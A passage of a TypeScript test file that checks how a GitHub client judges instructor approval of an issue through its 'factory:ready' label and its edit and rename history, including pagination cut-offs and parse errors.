    const whole = approvalReply(noise(100), 100, null, creationOnly("tom"));
    assert.deepStrictEqual(yield* approvalOf(whole, ["tom"]), refused(NOT_FOUND));
    // A page short of 100 is not the cut-off that rule is about.
    const short = approvalReply(noise(99), 120, null, creationOnly("tom"));
    assert.deepStrictEqual(yield* approvalOf(short, ["tom"]), refused(NOT_FOUND));
  }),
);

it.effect("an instructor edit after the label is approved", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "tom")],
      [AFTER, "amy"],
      [
        [CREATED, "eve"],
        [AFTER, "amy"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom", "amy"]), approved(LABELED, "tom"));
  }),
);

it.effect("a non-instructor edit after the label is refused", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "tom")],
      [AFTER, "eve"],
      [
        [CREATED, "eve"],
        [AFTER, "eve"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(editedAfter(LABELED)));
  }),
);

it.effect("a non-instructor edit followed by an instructor edit is refused", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "tom")],
      [LATER, "tom"],
      [
        [CREATED, "eve"],
        [AFTER, "eve"],
        [LATER, "tom"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(editedAfter(LABELED)));
  }),
);

it.effect("an edit by a deleted account after the label is refused", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "tom")],
      [AFTER, null],
      [
        [CREATED, "eve"],
        [AFTER, null],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(editedAfter(LABELED)));
  }),
);

it.effect("edits before the label are ignored whoever made them", () =>
  Effect.gen(function* () {
    // The instructor approved the text as it stood when they applied the label.
    const answer = eventsReply(
      [readyOn(LABELED, "tom")],
      ["2026-10-04T09:30:00Z", "eve"],
      [
        [CREATED, "eve"],
        ["2026-10-04T09:00:00Z", null],
        ["2026-10-04T09:30:00Z", "eve"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));
  }),
);

it.effect("an edit in the same second as the label counts as after it", () =>
  Effect.gen(function* () {
    const stranger = eventsReply(
      [readyOn(LABELED, "tom")],
      [LABELED, "eve"],
      [
        [CREATED, "eve"],
        [LABELED, "eve"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(stranger, ["tom"]), refused(editedAfter(LABELED)));
    // An instructor's edit in that second is fine, and one second earlier is before it.
    const instructor = eventsReply(
      [readyOn(LABELED, "tom")],
      [LABELED, "tom"],
      [
        [CREATED, "eve"],
        [LABELED, "tom"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(instructor, ["tom"]), approved(LABELED, "tom"));
    const before = eventsReply(
      [readyOn(LABELED, "tom")],
      ["2026-10-04T09:59:59Z", "eve"],
      [
        [CREATED, "eve"],
        ["2026-10-04T09:59:59Z", "eve"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(before, ["tom"]), approved(LABELED, "tom"));
  }),
);

it.effect("only the label that is in force sets the cut off for edits", () =>
  Effect.gen(function* () {
    // An edit between an old, removed label and the label now in force is before it.
    const answer = eventsReply(
      [
        readyOn("2026-10-04T09:00:00Z", "tom"),
        readyOff("2026-10-04T09:10:00Z", "tom"),
        readyOn(LABELED, "tom"),
      ],
      ["2026-10-04T09:30:00Z", "eve"],
      [
        [CREATED, "eve"],
        ["2026-10-04T09:30:00Z", "eve"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));
  }),
);

/** `n` seconds, one apart, from 10:01:00. */
const secondsAfterLabel = (n: number): Array<string> =>
  Array.from(
    { length: n },
    (_, i) => `2026-10-04T10:${pad(1 + Math.floor(i / 60))}:${pad(i % 60)}Z`,
  );

it.effect("a full page of edits is an incomplete history", () =>
  Effect.gen(function* () {
    const times = secondsAfterLabel(100);
    const history = (n: number): Array<Edit> => times.slice(0, n).map((t) => [t, "tom"]);
    const last = (n: number): Edit => [times[n - 1]!, "tom"];
    const events = () => [readyOn(LABELED, "tom")];
    assert.deepStrictEqual(
      yield* approvalOf(eventsReply(events(), last(99), history(99)), ["tom"]),
      approved(LABELED, "tom"),
    );
    assert.deepStrictEqual(
      yield* approvalOf(eventsReply(events(), last(100), history(100)), ["tom"]),
      refused(historyCut(LABELED)),
    );
  }),
);

it.effect(
  "an edit total above the page is an incomplete history when the label may be hidden",
  () =>
    Effect.gen(function* () {
      // Both shown entries are after the label, so older ones could be too.
      const nodes: Array<Edit> = [
        [LATER, "tom"],
        [AFTER, "tom"],
      ];
      const last: Edit = [LATER, "tom"];
      const run = (total: number) =>
        approvalOf(approvalReplyRaw([readyOn(LABELED, "tom")], 1, last, nodes, total), ["tom"]);
      assert.deepStrictEqual(yield* run(2), approved(LABELED, "tom"));
      assert.deepStrictEqual(yield* run(5), refused(historyCut(LABELED)));
    }),
);

it.effect("the newest edit entry must be the last edit", () =>
  Effect.gen(function* () {
    const create: Edit = [CREATED, "tom"];
    const last: Edit = [AFTER, "tom"];
    const run = (nodes: ReadonlyArray<Edit>) =>
      approvalOf(approvalReplyRaw([readyOn(LABELED, "tom")], 1, last, nodes, nodes.length), [
        "tom",
        "amy",
      ]);
    assert.deepStrictEqual(yield* run([[AFTER, "tom"], create]), approved(LABELED, "tom"));
    // Another time, another editor (both instructors), or no entry for it.
    const wrong: ReadonlyArray<ReadonlyArray<Edit>> = [
      [["2026-10-04T10:20:00Z", "tom"], create],
      [[AFTER, "amy"], create],
      [create],
      [],
    ];
    for (const nodes of wrong) {
      assert.deepStrictEqual(yield* run(nodes), refused(historyCut(LABELED)));
    }
  }),
);

it.effect("a visible stranger edit is named even when the history is also cut off", () =>
  Effect.gen(function* () {
    const nodes: Array<Edit> = [
      [AFTER, "eve"],
      [CREATED, "tom"],
    ];
    const answer = approvalReplyRaw([readyOn(LABELED, "tom")], 1, [AFTER, "eve"], nodes, 9);
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(editedAfter(LABELED)));
  }),
);

it.effect("the label is judged before the edits", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "eve")],
      [AFTER, "eve"],
      [
        [CREATED, "eve"],
        [AFTER, "eve"],
      ],
    );
    assert.deepStrictEqual(
      yield* approvalOf(answer, ["tom"]),
      refused(byNonInstructor("eve", LABELED)),
    );
  }),
);

it.effect("approval with no instructors approves nothing", () =>
  Effect.gen(function* () {
    const answer = eventsReply([readyOn(LABELED, "tom")], null, creationOnly("tom"));
    assert.deepStrictEqual(yield* approvalOf(answer, []), refused(byNonInstructor("tom", LABELED)));
  }),
);

/** The error `approval` gives for this answer, or null when it reads it. */
const approvalError = (answer: string) =>
  Effect.gen(function* () {
    const t = setup(reply(answer));
    return yield* t.ok(
      t.github
        .approval(6, ["tom"])
        .pipe(Effect.match({ onFailure: (e) => e, onSuccess: () => null })),
    );
  });

/** Whether `answer` is a parse error that names the approval call. */
const isApprovalParseError = (answer: string) =>
  approvalError(answer).pipe(
    Effect.map(
      (error) =>
        error !== null &&
        error._tag === "GitHubParse" &&
        JSON.stringify(error.args) === JSON.stringify(approvalCall()),
    ),
  );

it.effect("approval answers that cannot be read are parse errors", () =>
  Effect.gen(function* () {
    const good = (events: unknown, edits: unknown) =>
      JSON.stringify({
        data: {
          repository: {
            issue: {
              timelineItems: { totalCount: 1, nodes: events },
              lastEditedAt: null,
              editor: null,
              userContentEdits: edits,
            },
          },
        },
      });
    const edits = editsJson([[CREATED, "tom"]], 1);
    // The control: this one is fine.
    assert.isFalse(yield* isApprovalParseError(good([readyOn(LABELED, "tom")], edits)));

    for (const bad of [
      "not json",
      "",
      "{}",
      '{"data":{"repository":null}}',
      '{"errors":[{"message":"x"}]}',
      // No label events, no edit history, no total counts.
      '{"data":{"repository":{"issue":{"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":0,"nodes":[]}}}}}',
      '{"data":{"repository":{"issue":{"timelineItems":{"totalCount":0,"nodes":[]},"lastEditedAt":null,"editor":null}}}}',
      '{"data":{"repository":{"issue":{"timelineItems":{"nodes":[]},"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":0,"nodes":[]}}}}}',
    ]) {
      assert.isTrue(yield* isApprovalParseError(bad), bad);
    }
    // A node missing its time, its label, or its type, or of a type we did not ask for.
    for (const broken of [
      { __typename: "LabeledEvent", actor: { login: "tom" }, label: { name: "factory:ready" } },
      { __typename: "LabeledEvent", createdAt: LABELED, actor: { login: "tom" } },
      { createdAt: LABELED, actor: { login: "tom" }, label: { name: "factory:ready" } },
      { __typename: "ClosedEvent", createdAt: LABELED },
    ]) {
      assert.isTrue(yield* isApprovalParseError(good([broken], edits)), JSON.stringify(broken));
    }
  }),
);

it.effect("a malformed timestamp is a parse error", () =>
  Effect.gen(function* () {
    for (const at of ["2026-10-04 10:00:00Z", "2026-10-04T10:00:00", "", "yesterday"]) {
      // In the label event.
      const inLabel = eventsReply([readyOn(at, "tom")], null, creationOnly("tom"));
      assert.isTrue(yield* isApprovalParseError(inLabel), `label at ${at}`);
      // In the edit history.
      const inEdit = eventsReply(
        [readyOn(LABELED, "tom")],
        [AFTER, "tom"],
        [
          [CREATED, "tom"],
          [at, "tom"],
        ],
      );
      assert.isTrue(yield* isApprovalParseError(inEdit), `edit at ${at}`);
      // In lastEditedAt.
      const inLast = eventsReply(
        [readyOn(LABELED, "tom")],
        [at, "tom"],
        [
          [CREATED, "tom"],
          [at, "tom"],
        ],
      );
      assert.isTrue(yield* isApprovalParseError(inLast), `last edit at ${at}`);
      const inRename = eventsReply(
        [readyOn(LABELED, "tom"), renameEvent(at, "tom")],
        null,
        creationOnly("tom"),
      );
      assert.isTrue(yield* isApprovalParseError(inRename), `rename at ${at}`);
    }
  }),
);

it.effect("approval failures from gh are errors with the call", () =>
  Effect.gen(function* () {
    const failed = setup(fail(1, "HTTP 502"));
    const error = yield* failed.err(failed.github.approval(6, ["tom"]));
    assert.strictEqual(error._tag, "GitHubFailed");
    assert.deepStrictEqual(error._tag === "GitHubFailed" && error.args, approvalCall());
    assert.strictEqual(error._tag === "GitHubFailed" && error.status, 1);

    const spawn = setup(spawnError());
    assert.strictEqual(
      (yield* spawn.err(spawn.github.approval(6, ["tom"])))._tag,
      "GitHubSpawnError",
    );
  }),
);

/** `n` instructor renames after the label, oldest first, one second apart. */
const renamesAfterLabel = (n: number): Array<TimelineNode> =>
  secondsAfterLabel(n).map((at) => renameEvent(at, "tom"));

it.effect("a title renamed by a non-instructor after the label is refused", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "tom"), renameEvent(AFTER, "eve")],
      null,
      creationOnly("eve"),
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(editedAfter(LABELED)));
  }),
);

it.effect("a title renamed by an instructor after the label is approved", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "tom"), renameEvent(AFTER, "AMY")],
      null,
      creationOnly("eve"),
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom", "amy"]), approved(LABELED, "tom"));
  }),
);

it.effect("a rename by a deleted account after the label is refused", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "tom"), renameEvent(AFTER, null)],
      null,
      creationOnly("eve"),
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(editedAfter(LABELED)));
  }),
);

it.effect("a stranger rename followed by an instructor rename is refused", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "tom"), renameEvent(AFTER, "eve"), renameEvent(LATER, "tom")],
      null,
      creationOnly("eve"),
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(editedAfter(LABELED)));
  }),
);

it.effect("a stranger rename is refused even when every body edit is an instructor's", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "tom"), renameEvent(LATER, "eve")],
      [AFTER, "tom"],
      [
        [CREATED, "eve"],
        [AFTER, "tom"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(editedAfter(LABELED)));
  }),
);

it.effect("renames before the label in force are ignored", () =>
  Effect.gen(function* () {
    // Before the label, and between a removed label and the one in force.
    const answer = eventsReply(
      [
        renameEvent("2026-10-04T08:30:00Z", "eve"),
        readyOn("2026-10-04T09:00:00Z", "tom"),
        readyOff("2026-10-04T09:10:00Z", "tom"),
        renameEvent("2026-10-04T09:30:00Z", null),
        readyOn(LABELED, "tom"),
      ],
      null,
      creationOnly("eve"),
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));
  }),
);

it.effect("a rename in the same second as the label counts as after it", () =>
  Effect.gen(function* () {
    const stranger = eventsReply(
      [readyOn(LABELED, "tom"), renameEvent(LABELED, "eve")],
      null,
      creationOnly("eve"),
    );
    assert.deepStrictEqual(yield* approvalOf(stranger, ["tom"]), refused(editedAfter(LABELED)));
    const instructor = eventsReply(
      [
        renameEvent("2026-10-04T09:59:59Z", "eve"),
        readyOn(LABELED, "tom"),
        renameEvent(LABELED, "tom"),
      ],
      null,
      creationOnly("eve"),
    );
    assert.deepStrictEqual(yield* approvalOf(instructor, ["tom"]), approved(LABELED, "tom"));
  }),
);

it.effect("labels and renames share the page and the label in force is enough", () =>
  Effect.gen(function* () {
    // The label is the oldest event shown, so every later event, the renames included, is on
    // the page: events come oldest first and the page is the newest 100. Nothing before the
    // label matters, whatever the total.
    const events = [readyOn(LABELED, "tom"), ...renamesAfterLabel(99)];
    const answer = approvalReply(events, 400, null, creationOnly("eve"));
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));

    // A stranger's rename on that page is seen.
    const withStranger = [...events];
    withStranger[50] = renameEvent("2026-10-04T10:20:00Z", "eve");
    const seen = approvalReply(withStranger, 400, null, creationOnly("eve"));
    assert.deepStrictEqual(yield* approvalOf(seen, ["tom"]), refused(editedAfter(LABELED)));
  }),
);

it.effect(
  "a page of renames without the label is a missing label history, not a stranger edit",
  () =>
    Effect.gen(function* () {
      // The label is older than all 100 shown events. Nothing shown can be told to be after it.
      const events = Array.from({ length: 100 }, () => renameEvent(AFTER, "eve"));
      const answer = approvalReply(events, 150, null, creationOnly("eve"));
      assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(LABEL_CUT));
    }),
);

/** `n` seconds, one apart, from `hour`:00:00. */
const editTimes = (hour: number, n: number): Array<string> =>
  Array.from(
    { length: n },
    (_, i) => `2026-10-04T${pad(hour)}:${pad(Math.floor(i / 60))}:${pad(i % 60)}Z`,
  );

it.effect(
  "a hundred edits with the oldest shown before the label are judged by the visible ones",
  () =>
    Effect.gen(function* () {
      // 99 entries before the label (09:xx) and the newest, an instructor's, after it.
      const history: Array<Edit> = [
        ...editTimes(9, 99).map((t): Edit => [t, "tom"]),
        [AFTER, "tom"],
      ];
      const events = () => [readyOn(LABELED, "tom")];
      const answer = eventsReply(events(), [AFTER, "tom"], history);
      assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));

      // The same page with the newest edit by a stranger.
      const withStranger: Array<Edit> = [...history.slice(0, -1), [AFTER, "eve"]];
      const refusedAnswer = eventsReply(events(), [AFTER, "eve"], withStranger);
      assert.deepStrictEqual(
        yield* approvalOf(refusedAnswer, ["tom"]),
        refused(editedAfter(LABELED)),
      );
    }),
);

it.effect("a hundred edits all after the label cannot be judged", () =>
  Effect.gen(function* () {
    const times = secondsAfterLabel(100);
    const history = times.map((t): Edit => [t, "tom"]);
    const answer = eventsReply([readyOn(LABELED, "tom")], [times[99]!, "tom"], history);
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), refused(historyCut(LABELED)));
  }),
);

it.effect("a total above the page is judged when the oldest shown entry is before the label", () =>
  Effect.gen(function* () {
    const last: Edit = [LATER, "tom"];
    const run = (nodes: ReadonlyArray<Edit>) =>
      approvalOf(approvalReplyRaw([readyOn(LABELED, "tom")], 1, last, nodes, 150), ["tom"]);
    assert.deepStrictEqual(
      yield* run([
        [LATER, "tom"],
        [AFTER, "tom"],
        ["2026-10-04T09:30:00Z", "tom"],
      ]),
      approved(LABELED, "tom"),
    );
    // The oldest shown entry must be strictly before the label.
    assert.deepStrictEqual(
      yield* run([
        [LATER, "tom"],
        [LABELED, "tom"],
      ]),
      refused(historyCut(LABELED)),
    );
    assert.deepStrictEqual(
      yield* run([
        [LATER, "tom"],
        [AFTER, "tom"],
      ]),
      refused(historyCut(LABELED)),
    );
  }),
);

it.effect("a cut page still needs its newest entry to be the last edit", () =>
  Effect.gen(function* () {
    const nodes: Array<Edit> = [
      [LATER, "tom"],
      ...editTimes(9, 99)
        .toReversed()
        .map((t): Edit => [t, "tom"]),
    ];
    assert.strictEqual(nodes.length, 100);
    const run = (last: Edit) =>
      approvalOf(approvalReplyRaw([readyOn(LABELED, "tom")], 1, last, nodes, 100), ["tom"]);
    assert.deepStrictEqual(yield* run([LATER, "tom"]), approved(LABELED, "tom"));
    // GitHub says the last edit was another one.
    assert.deepStrictEqual(yield* run([AFTER, "tom"]), refused(historyCut(LABELED)));
    assert.deepStrictEqual(yield* run([LATER, "amy"]), refused(historyCut(LABELED)));
  }),
);

it.effect("a label applied by an actor that is not a user is refused whatever its login", () =>
  Effect.gen(function* () {
    for (const typename of ["Bot", "Organization", "Mannequin", "EnterpriseUserAccount", ""]) {
      const event = { ...readyOn(LABELED, "tom"), actor: { __typename: typename, login: "tom" } };
      const answer = eventsReply([event], null, creationOnly("eve"));
      assert.deepStrictEqual(
        yield* approvalOf(answer, ["tom"]),
        refused(byNonInstructor("tom", LABELED)),
        typename,
      );
    }
  }),
);

it.effect("an actor without a typename is not an instructor", () =>
  Effect.gen(function* () {
    const event = { ...readyOn(LABELED, "tom"), actor: { login: "tom" } };
    const answer = eventsReply([event], null, creationOnly("eve"));
    assert.deepStrictEqual(
      yield* approvalOf(answer, ["tom"]),
      refused(byNonInstructor("tom", LABELED)),
    );
  }),
);

/** `answer` with the type of the newest history entry's editor replaced. */
const withEditorTypename = (answer: string, typename: string): string => {
  const json = JSON.parse(answer) as {
    data: {
      repository: {
        issue: { userContentEdits: { nodes: Array<{ editor: { __typename: string } }> } };
      };
    };
  };
  json.data.repository.issue.userContentEdits.nodes[0]!.editor.__typename = typename;
  return JSON.stringify(json);
};

it.effect("a body edit or rename by something that is not a user after the label is refused", () =>
  Effect.gen(function* () {
    const answer = eventsReply(
      [readyOn(LABELED, "tom")],
      [AFTER, "tom"],
      [
        [CREATED, "eve"],
        [AFTER, "tom"],
      ],
    );
    assert.deepStrictEqual(yield* approvalOf(answer, ["tom"]), approved(LABELED, "tom"));
    for (const typename of ["Bot", "Mannequin", ""]) {
      assert.deepStrictEqual(
        yield* approvalOf(withEditorTypename(answer, typename), ["tom"]),
        refused(editedAfter(LABELED)),
        `edit by ${typename}`,
      );
    }

    const rename = { ...renameEvent(AFTER, "tom"), actor: { __typename: "Bot", login: "tom" } };
    const renamed = eventsReply([readyOn(LABELED, "tom"), rename], null, creationOnly("eve"));
    assert.deepStrictEqual(yield* approvalOf(renamed, ["tom"]), refused(editedAfter(LABELED)));
  }),
);

it.effect("a creation entry by something that is not a user before the label is ignored", () =>
  Effect.gen(function* () {
    const answer = eventsReply([readyOn(LABELED, "tom")], null, creationOnly("dependabot"));
    assert.deepStrictEqual(
      yield* approvalOf(withEditorTypename(answer, "Bot"), ["tom"]),
      approved(LABELED, "tom"),
    );
  }),
);

it.effect("approval for a repo that is not owner/name makes no call", () =>
  Effect.gen(function* () {
    const t = setup();
    const error = yield* t.err(
      makeGitHub({ repo: "softfac", ghConfigDir: GH_CONFIG_DIR }).approval(6, ["tom"]),
    );
    assert.strictEqual(error._tag, "GitHubParse");
    assert.deepStrictEqual(t.calls(), []);
  }),
);

const textCheckOf = (answer: string, since: string, who: ReadonlyArray<string>) =>
  Effect.gen(function* () {
    const t = setup(reply(answer));
    const found: TextCheck = yield* t.ok(t.github.textCheck(6, since, who));
    assert.deepStrictEqual(t.calls(), [approvalCall()]);
    return found;
  });

it.effect("text check tells unchanged from changed from unjudged", () =>
  Effect.gen(function* () {
    // Unchanged: instructors only.
    const instructors = eventsReply(
      [readyOn(LABELED, "tom"), renameEvent(AFTER, "tom")],
      [AFTER, "tom"],
      [
        [CREATED, "eve"],
        [AFTER, "tom"],
      ],
    );
    assert.strictEqual(yield* textCheckOf(instructors, LABELED, ["tom"]), "unchanged");
    // Changed: a stranger's rename, a deleted account's edit.
    const renamed = eventsReply(
      [readyOn(LABELED, "tom"), renameEvent(AFTER, "eve")],
      null,
      creationOnly("eve"),
    );
    assert.strictEqual(yield* textCheckOf(renamed, LABELED, ["tom"]), "changed");
    const edited = eventsReply(
      [readyOn(LABELED, "tom")],
      [AFTER, null],
      [
        [CREATED, "eve"],
        [AFTER, null],
      ],
    );
    assert.strictEqual(yield* textCheckOf(edited, LABELED, ["tom"]), "changed");
  }),
);

it.effect("text check says unjudged when the histories cannot be read whole", () =>
  Effect.gen(function* () {
    // A full page of body edits after the label, all by instructors, with more behind it.
    const times = secondsAfterLabel(100);
    const oldestFirst = times.map((t): Edit => [t, "tom"]);
    const last: Edit = [times[99]!, "tom"];
    const full = eventsReply([readyOn(LABELED, "tom")], last, oldestFirst);
    assert.strictEqual(yield* textCheckOf(full, LABELED, ["tom"]), "unjudged");
    // A stranger shown on that page is still a change: it wins.
    const withStranger = [...oldestFirst];
    withStranger[50] = [times[50]!, "eve"];
    const stranger = eventsReply([readyOn(LABELED, "tom")], last, withStranger);
    assert.strictEqual(yield* textCheckOf(stranger, LABELED, ["tom"]), "changed");
  }),
);

it.effect("text check ignores who applied labels but not bots", () =>
  Effect.gen(function* () {
    // Labels are not text: a stranger's label event is not a change.
    const labelled = eventsReply(
      [readyOn(LABELED, "tom"), labelEvent("LabeledEvent", AFTER, "eve", "bug")],
      null,
      creationOnly("eve"),
    );
    assert.strictEqual(yield* textCheckOf(labelled, LABELED, ["tom"]), "unchanged");
    // A bot with an instructor's login is not an instructor.
    const rename = { ...renameEvent(AFTER, "tom"), actor: { __typename: "Bot", login: "tom" } };
    const bot = eventsReply([readyOn(LABELED, "tom"), rename], null, creationOnly("eve"));
    assert.strictEqual(yield* textCheckOf(bot, LABELED, ["tom"]), "changed");
  }),
);

it.effect("text check cannot judge histories that may hide something", () =>
  Effect.gen(function* () {
    // A full page of body edits all at or after the moment.
    const times = secondsAfterLabel(100);
    const history = times.map((t): Edit => [t, "tom"]);
    const edits = eventsReply([readyOn(LABELED, "tom")], [times[99]!, "tom"], history);
    assert.strictEqual(yield* textCheckOf(edits, LABELED, ["tom"]), "unjudged");

    // A full timeline page whose oldest event is at or after the moment may hide renames.
    const events = Array.from({ length: 100 }, () => renameEvent(AFTER, "tom"));
    const full = approvalReply(events, 150, null, creationOnly("eve"));
    assert.strictEqual(yield* textCheckOf(full, LABELED, ["tom"]), "unjudged");
    // The same page with its oldest event before the moment shows everything after it.
    const reaching = [renameEvent("2026-10-04T09:00:00Z", "eve"), ...events.slice(1)];
    const reachingAnswer = approvalReply(reaching, 150, null, creationOnly("eve"));
    assert.strictEqual(yield* textCheckOf(reachingAnswer, LABELED, ["tom"]), "unchanged");

    // The newest body entry must be the last edit.
    const stale = approvalReplyRaw(
      [readyOn(LABELED, "tom")],
      1,
      [AFTER, "tom"],
      [[CREATED, "eve"]],
      1,
    );
    assert.strictEqual(yield* textCheckOf(stale, LABELED, ["tom"]), "unjudged");
  }),
);

it.effect("a cut off timeline page whose oldest event is exactly at since cannot be judged", () =>
  Effect.gen(function* () {
    // Events before `since` could still be hidden at the same second, so the page must reach
    // strictly before it.
    const page = (oldest: string) =>
      approvalReply(
        [
          renameEvent(oldest, "tom"),
          ...Array.from({ length: 99 }, () => renameEvent(AFTER, "tom")),
        ],
        150,
        null,
        creationOnly("eve"),
      );
    assert.strictEqual(yield* textCheckOf(page(LABELED), LABELED, ["tom"]), "unjudged");
    assert.strictEqual(yield* textCheckOf(page(AFTER), LABELED, ["tom"]), "unjudged");
    assert.strictEqual(
      yield* textCheckOf(page("2026-10-04T09:59:59Z"), LABELED, ["tom"]),
      "unchanged",
    );
  }),
);

it.effect("each half of the timeline cut off rule alone stops the judgement", () =>
  Effect.gen(function* () {
    const renames = (n: number) => Array.from({ length: n }, () => renameEvent(AFTER, "tom"));
    // A full page of 100 with nothing more: still a page that may have been cut.
    const full = approvalReply(renames(100), 100, null, creationOnly("eve"));
    assert.strictEqual(yield* textCheckOf(full, LABELED, ["tom"]), "unjudged");
    // Fewer than 100 shown with a larger total: something is hidden.
    const short = approvalReply(renames(99), 120, null, creationOnly("eve"));
    assert.strictEqual(yield* textCheckOf(short, LABELED, ["tom"]), "unjudged");
    // The control: 99 shown of a total of 99 is the whole timeline.
    const whole = approvalReply(renames(99), 99, null, creationOnly("eve"));
    assert.strictEqual(yield* textCheckOf(whole, LABELED, ["tom"]), "unchanged");
  }),
);

it.effect("text check is changed for a stranger edit or rename at or after the moment", () =>
  Effect.gen(function* () {
    const edited = (at: string, who: Who) =>
      eventsReply(
        [readyOn(LABELED, "tom")],
        [at, who],
        [
          [CREATED, "eve"],
          [at, who],
        ],
      );
    const renamed = (at: string, who: Who) =>
      eventsReply([readyOn(LABELED, "tom"), renameEvent(at, who)], null, creationOnly("eve"));
    for (const at of [LABELED, AFTER]) {
      for (const who of ["eve", null]) {
        assert.strictEqual(yield* textCheckOf(edited(at, who), LABELED, ["tom"]), "changed");
        assert.strictEqual(yield* textCheckOf(renamed(at, who), LABELED, ["tom"]), "changed");
      }
    }
    // One second before the moment is before it.
    assert.strictEqual(
      yield* textCheckOf(edited("2026-10-04T09:59:59Z", "eve"), LABELED, ["tom"]),
      "unchanged",
    );
    assert.strictEqual(
      yield* textCheckOf(renamed("2026-10-04T09:59:59Z", "eve"), LABELED, ["tom"]),
      "unchanged",
    );
  }),
);

it.effect("text check with a timestamp that is not GitHub's form makes no call", () =>
  Effect.gen(function* () {
    for (const since of ["", "2026-10-04 10:00:00Z", "2026-10-04T10:00:00", "now"]) {
      const t = setup();
      const error = yield* t.err(t.github.textCheck(6, since, ["tom"]));
      assert.strictEqual(error._tag, "GitHubParse", since);
      assert.deepStrictEqual(error._tag === "GitHubParse" && error.args, ["api", "graphql"]);
      assert.deepStrictEqual(t.calls(), [], since);
    }
  }),
);

it.effect("text check errors are typed", () =>
  Effect.gen(function* () {
    const bad = setup(reply("not json"));
    const parse = yield* bad.err(bad.github.textCheck(6, LABELED, ["tom"]));
    assert.strictEqual(parse._tag, "GitHubParse");
    assert.deepStrictEqual(parse._tag === "GitHubParse" && parse.args, approvalCall());

    const failed = setup(fail(1, "HTTP 502"));
    const error = yield* failed.err(failed.github.textCheck(6, LABELED, ["tom"]));
    assert.strictEqual(error._tag, "GitHubFailed");
    assert.strictEqual(error._tag === "GitHubFailed" && error.status, 1);

    const answer = eventsReply([readyOn(LABELED, "tom")], ["later", "tom"], creationOnly("tom"));
    const malformed = setup(reply(answer));
    assert.strictEqual(
      (yield* malformed.err(malformed.github.textCheck(6, LABELED, ["tom"])))._tag,
      "GitHubParse",
    );
  }),
);

const editedSinceOf = (answer: string, since: string) =>
  Effect.gen(function* () {
    const t = setup(reply(answer));
    const found = yield* t.ok(t.github.textEditedSince(6, since));
    assert.deepStrictEqual(t.calls(), [approvalCall()]);
    return found;
  });

it.effect("text edited since is false when nothing touched the text at or after the moment", () =>
  Effect.gen(function* () {
    // An edit and a rename before the moment, by anyone, and a label event after it.
    const answer = eventsReply(
      [
        renameEvent("2026-10-04T09:00:00Z", "eve"),
        readyOn(LABELED, "tom"),
        labelEvent("LabeledEvent", AFTER, "eve", "bug"),
      ],
      ["2026-10-04T09:59:59Z", "tom"],
      [
        [CREATED, "eve"],
        ["2026-10-04T09:59:59Z", "tom"],
      ],
    );
    assert.isFalse(yield* editedSinceOf(answer, LABELED));
  }),
);

it.effect(
  "text edited since is true for any edit or rename at or after the moment, even an instructor's",
  () =>
    Effect.gen(function* () {
      for (const at of [LABELED, AFTER]) {
        const edited = eventsReply(
          [readyOn(LABELED, "tom")],
          [at, "tom"],
          [
            [CREATED, "eve"],
            [at, "tom"],
          ],
        );
        assert.isTrue(yield* editedSinceOf(edited, LABELED), `edit at ${at}`);
        const renamed = eventsReply(
          [readyOn(LABELED, "tom"), renameEvent(at, "tom")],
          null,
          creationOnly("eve"),
        );
        assert.isTrue(yield* editedSinceOf(renamed, LABELED), `rename at ${at}`);
      }
    }),
);

it.effect("text edited since is true when the timeline may hide a rename", () =>
  Effect.gen(function* () {
    // A full page of newer label events with more behind it: a rename at the moment could be
    // among the hidden ones.
    const events = Array.from({ length: 100 }, (_, i) =>
      labelEvent(
        "LabeledEvent",
        `2026-10-04T11:${pad(Math.floor(i / 60))}:${pad(i % 60)}Z`,
        "eve",
        "bug",
      ),
    );
    const answer = approvalReply(events, 150, null, creationOnly("eve"));
    assert.isTrue(yield* editedSinceOf(answer, LABELED));
  }),
);

it.effect("text edited since refuses a moment that is not a GitHub timestamp", () =>
  Effect.gen(function* () {
    const t = setup();
    const error = yield* t.err(t.github.textEditedSince(6, "yesterday"));
    assert.strictEqual(error._tag, "GitHubParse");
    assert.deepStrictEqual(t.calls(), []);
  }),
);

it.effect(
  "approval sends one graphql call for the issue and uses the instructors it is given",
  () =>
    Effect.gen(function* () {
      const answer = JSON.stringify({
        data: {
          repository: {
            issue: {
              timelineItems: {
                totalCount: 1,
